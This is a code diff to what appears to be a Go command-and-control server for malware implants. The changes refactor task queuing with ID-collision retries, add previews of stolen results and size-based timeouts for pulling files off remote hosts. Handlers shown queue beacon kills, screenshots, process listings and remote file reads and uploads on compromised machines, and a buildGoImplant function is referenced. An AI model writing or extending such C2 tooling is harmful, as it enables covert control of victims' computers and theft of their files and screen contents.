@@ -197,21 +197,38 @@ func processCommand(clientID, command string) (string, interface{}, error) {
 		return "NOTE_SET", nil, nil
 	}
 
-	newID := "T-" + uuid.New().String()[:8]
-	task := &Task{
-		ID:        newID,
-		ClientID:  clientID,
-		Command:   command,
-		Status:    "pending",
-		CreatedAt: time.Now(),
-	}
-
-	if err := db.Create(task).Error; err != nil {
+	task, err := createPendingTask(clientID, command)
+	if err != nil {
 		return "", nil, err
 	}
 
 	go addLog("TASK", fmt.Sprintf("NEW_TASK_QUEUED: %s for %s", command, clientID))
 	return "TASK_QUEUED", task, nil
+}
+
+func newTaskID() string {
+	return "T-" + strings.ReplaceAll(uuid.New().String(), "-", "")[:12]
+}
+
+func createPendingTask(clientID, command string) (*Task, error) {
+	for attempt := 0; attempt < 5; attempt++ {
+		task := &Task{
+			ID:        newTaskID(),
+			ClientID:  clientID,
+			Command:   command,
+			Status:    "pending",
+			CreatedAt: time.Now(),
+		}
+		if err := db.Create(task).Error; err != nil {
+			// Retry on possible primary key collision.
+			if strings.Contains(strings.ToLower(err.Error()), "unique") || strings.Contains(strings.ToLower(err.Error()), "constraint") {
+				continue
+			}
+			return nil, err
+		}
+		return task, nil
+	}
+	return nil, fmt.Errorf("failed to create unique task id")
 }
 
 var (
@@ -838,15 +855,10 @@ func handleKillBeacon(c *gin.Context) {
 		return
 	}
 
-	taskID := "T-" + uuid.New().String()[:8]
-	task := &Task{
-		ID:        taskID,
-		ClientID:  id,
-		Command:   "__EXIT__",
-		Status:    "pending",
-		CreatedAt: time.Now(),
+	if _, err := createPendingTask(id, "__EXIT__"); err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_QUEUE_KILL"})
+		return
 	}
-	db.Create(task)
 
 	db.Model(&Client{}).Where("id = ?", id).Update("status", "offline")
 	addLog("C2", fmt.Sprintf("KILL_SIGNAL_SENT: %s (%s@%s)", id, client.Username, client.Hostname))
@@ -893,15 +905,11 @@ func handleQuickCommand(c *gin.Context) {
 		return
 	}
 
-	taskID := "T-" + uuid.New().String()[:8]
-	task := &Task{
-		ID:        taskID,
-		ClientID:  req.ClientID,
-		Command:   cmd,
-		Status:    "pending",
-		CreatedAt: time.Now(),
+	task, err := createPendingTask(req.ClientID, cmd)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_QUEUE_TASK"})
+		return
 	}
-	db.Create(task)
 	addLog("TASK", fmt.Sprintf("QUICK_CMD[%s]: %s for %s", req.Action, cmd, req.ClientID))
 
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "TASK_QUEUED", Data: task})
@@ -1496,21 +1504,110 @@ func buildGoImplant(dstFile, targetOS, targetArch, c2URL, beaconID string, sleep
 
 // --- Task Handlers ---
 
+type taskListRow struct {
+	ID           string    `json:"id"`
+	ClientID     string    `json:"client_id"`
+	Command      string    `json:"command"`
+	Status       string    `json:"status"`
+	ResultPrefix string    `gorm:"column:result_prefix"`
+	ResultSize   int64     `gorm:"column:result_size"`
+	CreatedAt    time.Time `json:"created_at"`
+}
+
+type taskListItem struct {
+	ID           string    `json:"id"`
+	ClientID     string    `json:"client_id"`
+	Command      string    `json:"command"`
+	Status       string    `json:"status"`
+	Result       string    `json:"result"`
+	ResultSize   int64     `json:"result_size"`
+	HasResult    bool      `json:"has_result"`
+	IsScreenshot bool      `json:"is_screenshot"`
+	CreatedAt    time.Time `json:"created_at"`
+}
+
+func buildTaskResultPreview(command, resultPrefix string, resultSize int64) (string, bool, bool) {
+	if resultSize <= 0 {
+		return "", false, false
+	}
+
+	if strings.HasPrefix(resultPrefix, "SCREENSHOT:") {
+		return "[SCREENSHOT - Click to view]", true, true
+	}
+
+	if strings.HasPrefix(command, "__FILEREAD__ ") && strings.Contains(resultPrefix, "\"base64\"") {
+		return "[FILE DOWNLOAD DATA - Click to view]", false, true
+	}
+
+	preview := strings.ReplaceAll(resultPrefix, "\x00", "")
+	preview = strings.ReplaceAll(preview, "\r", "")
+	preview = strings.TrimSpace(preview)
+	if preview == "" {
+		preview = "(empty output)"
+	}
+	if resultSize > int64(len(resultPrefix)) {
+		preview += "..."
+	}
+	return preview, false, true
+}
+
+func handleGetTask(c *gin.Context) {
+	taskID := c.Param("id")
+	if taskID == "" {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "TASK_ID_REQUIRED"})
+		return
+	}
+
+	var task Task
+	result := db.Limit(1).Find(&task, "id = ?", taskID)
+	if result.Error != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_LOAD_TASK"})
+		return
+	}
+	if result.RowsAffected == 0 {
+		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "TASK_NOT_FOUND"})
+		return
+	}
+
+	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: task})
+}
+
 func handleGetTasks(c *gin.Context) {
 	clientID := c.Query("client_id")
 	status := c.Query("status")
-	var taskList []Task
+	var taskList []taskListRow
 
-	query := db.Order("created_at desc")
+	query := db.Model(&Task{}).
+		Select("id, client_id, command, status, created_at, coalesce(substr(result, 1, 160), '') as result_prefix, coalesce(length(result), 0) as result_size").
+		Order("created_at desc")
 	if clientID != "" {
 		query = query.Where("client_id = ?", clientID)
 	}
 	if status != "" {
 		query = query.Where("status = ?", status)
 	}
-	query.Limit(200).Find(&taskList)
+	if err := query.Limit(200).Find(&taskList).Error; err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_LOAD_TASKS"})
+		return
+	}
 
-	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: taskList})
+	items := make([]taskListItem, 0, len(taskList))
+	for _, task := range taskList {
+		preview, isScreenshot, hasResult := buildTaskResultPreview(task.Command, task.ResultPrefix, task.ResultSize)
+		items = append(items, taskListItem{
+			ID:           task.ID,
+			ClientID:     task.ClientID,
+			Command:      task.Command,
+			Status:       task.Status,
+			Result:       preview,
+			ResultSize:   task.ResultSize,
+			HasResult:    hasResult,
+			IsScreenshot: isScreenshot,
+			CreatedAt:    task.CreatedAt,
+		})
+	}
+
+	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: items})
 }
 
 func handleCreateTask(c *gin.Context) {
@@ -2380,17 +2477,13 @@ func handleGetProcesses(c *gin.Context) {
 	}
 
 	// Queue a process listing task
-	taskID := "T-" + uuid.New().String()[:8]
-	task := &Task{
-		ID:        taskID,
-		ClientID:  clientID,
-		Command:   "tasklist /v /fo csv",
-		Status:    "pending",
-		CreatedAt: time.Now(),
+	task, err := createPendingTask(clientID, "tasklist /v /fo csv")
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_QUEUE_PROCESS_LIST"})
+		return
 	}
-	db.Create(task)
 
-	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PROCESS_LIST_QUEUED", Data: map[string]string{"task_id": taskID}})
+	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PROCESS_LIST_QUEUED", Data: map[string]string{"task_id": task.ID}})
 }
 
 func handleGetScreenshot(c *gin.Context) {
@@ -2400,17 +2493,13 @@ func handleGetScreenshot(c *gin.Context) {
 		return
 	}
 
-	taskID := "T-" + uuid.New().String()[:8]
-	task := &Task{
-		ID:        taskID,
-		ClientID:  clientID,
-		Command:   "__SCREENSHOT__",
-		Status:    "pending",
-		CreatedAt: time.Now(),
+	task, err := createPendingTask(clientID, "__SCREENSHOT__")
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_QUEUE_SCREENSHOT"})
+		return
 	}
-	db.Create(task)
 
-	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "SCREENSHOT_QUEUED", Data: map[string]string{"task_id": taskID}})
+	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "SCREENSHOT_QUEUED", Data: map[string]string{"task_id": task.ID}})
 }
 
 // --- Middleware ---
@@ -3000,6 +3089,22 @@ func handleFMDownload(c *gin.Context) {
 
 // ==================== REMOTE FILE MANAGER (Beacon) ====================
 
+func fileTransferExtraTimeout(sizeBytes int64) time.Duration {
+	if sizeBytes <= 0 {
+		return 5 * time.Minute
+	}
+
+	sizeMB := (sizeBytes + 1024*1024 - 1) / (1024 * 1024)
+	timeout := 2*time.Minute + time.Duration(sizeMB)*5*time.Second
+	if timeout < 3*time.Minute {
+		timeout = 3 * time.Minute
+	}
+	if timeout > 12*time.Minute {
+		timeout = 12 * time.Minute
+	}
+	return timeout
+}
+
 // sendTaskAndWait creates a task for a beacon and polls the DB until the task completes or times out.
 // The timeout is automatically calculated based on the beacon's sleep interval + extra buffer.
 // The minExtra parameter adds extra time on top of the beacon-based timeout (e.g. for large file transfers).
@@ -3029,26 +3134,19 @@ func sendTaskAndWait(clientID, command string, minExtra time.Duration) (string, 
 		timeout = 15 * time.Second
 	}
 
-	taskID := "T-" + uuid.New().String()[:8]
-	task := &Task{
-		ID:        taskID,
-		ClientID:  clientID,
-		Command:   command,
-		Status:    "pending",
-		CreatedAt: time.Now(),
-	}
-	if err := db.Create(task).Error; err != nil {
+	task, err := createPendingTask(clientID, command)
+	if err != nil {
 		return "", fmt.Errorf("failed to create task: %v", err)
 	}
 
-	go addLog("TASK", fmt.Sprintf("RFM_TASK: %s -> %s (%s) timeout=%v", command, clientID, taskID, timeout))
+	go addLog("TASK", fmt.Sprintf("RFM_TASK: %s -> %s (%s) timeout=%v", command, clientID, task.ID, timeout))
 
 	// Poll for result
 	deadline := time.Now().Add(timeout)
 	for time.Now().Before(deadline) {
 		time.Sleep(500 * time.Millisecond)
 		var t Task
-		if err := db.First(&t, "id = ?", taskID).Error; err != nil {
+		if err := db.First(&t, "id = ?", task.ID).Error; err != nil {
 			continue
 		}
 		if t.Status == "completed" {
@@ -3060,7 +3158,7 @@ func sendTaskAndWait(clientID, command string, minExtra time.Duration) (string, 
 	}
 
 	// Timeout - mark task as failed
-	db.Model(&Task{}).Where("id = ?", taskID).Updates(map[string]interface{}{
+	db.Model(&Task{}).Where("id = ?", task.ID).Updates(map[string]interface{}{
 		"status": "failed",
 		"result": "TIMEOUT",
 	})
@@ -3109,7 +3207,8 @@ func handleRemoteFMDownload(c *gin.Context) {
 		return
 	}
 
-	result, err := sendTaskAndWait(clientID, "__FILEREAD__ "+path, 30*time.Second)
+	fileSize, _ := strconv.ParseInt(c.Query("size"), 10, 64)
+	result, err := sendTaskAndWait(clientID, "__FILEREAD__ "+path, fileTransferExtraTimeout(fileSize))
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 		return
@@ -3143,7 +3242,8 @@ func handleRemoteFMUpload(c *gin.Context) {
 	}
 
 	command := "__FILEUPLOAD__ " + req.Path + " " + req.Data
-	result, err := sendTaskAndWait(req.ClientID, command, 30*time.Second)
+	estimatedSize := int64(len(req.Data)) * 3 / 4
+	result, err := sendTaskAndWait(req.ClientID, command, fileTransferExtraTimeout(estimatedSize))
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 		return
